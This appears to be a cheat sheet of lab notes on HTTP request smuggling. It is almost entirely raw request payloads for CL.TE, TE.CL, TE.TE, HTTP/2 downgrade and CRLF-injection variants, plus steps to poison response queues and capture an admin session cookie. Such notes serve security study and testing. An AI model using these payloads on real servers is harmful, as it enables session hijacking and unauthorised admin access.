# Request Smuggling

## Finding CL.TE vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

a
b
```

## Finding TE.CL vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100
Transfer-Encoding: chunked

0

x
```

## CL.TE vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## TE.CL vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-length: 4
Transfer-Encoding: chunked

2b
GPOST / HTTP/1.1
Content-Length: 15

x=1
0
\r\n
\r\n
```

## TE.TE behavior: obfuscating the TE header
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## Finding H2.CL vulnerabilities using 404 techniques
```
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

## Finding H2.TE vulnerabilities using 404 techniques
```
POST / HTTP/2
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

## Response queue poisoning via H2.TE request smuggling
```
POST /x HTTP/2
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: vulnerable-website.com
\r\n
\r\n
```
Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

## HTTP/2 request smuggling via CRLF injection
1. Send the most recent POST / request to Burp Repeater and remove your session cookie before resending the request.
2. Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.
3. Using the Inspector, add an arbitrary header to the request. Append the sequence \r\n to the header's value, followed by the Transfer-Encoding: chunked header:

__Name__
```
foo
```
__Value__
```
bar\r\n
Transfer-Encoding: chunked
```

4. In the body, attempt to smuggle an arbitrary prefix as follows:
```
0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

## HTTP/2 request splitting via CRLF injection
<tbody>
                <tr>
                    <td class="tg-http2name">:method</td>
                    <td class="tg-http2value">GET</td>
                </tr>
                <tr>
                    <td class="tg-http2name">:path</td>
                    <td class="tg-http2value">/</td>
                </tr>
                <tr>
                    <td class="tg-http2name">:authority</td>
                    <td class="tg-http2value">vulnerable-website.com</td>
                </tr>
                <tr>
                    <td class="tg-http2name">foo</td>
                    <td class="tg-http2value"><p class="pre-wrap">bar<span class="grey">\r\n</span>
Host: vulnerable-website.com<span class="grey">\r\n</span>
<span class="grey">\r\n</span>
GET /admin HTTP/1.1</p>
                    </td>
                </tr>
                </tbody>
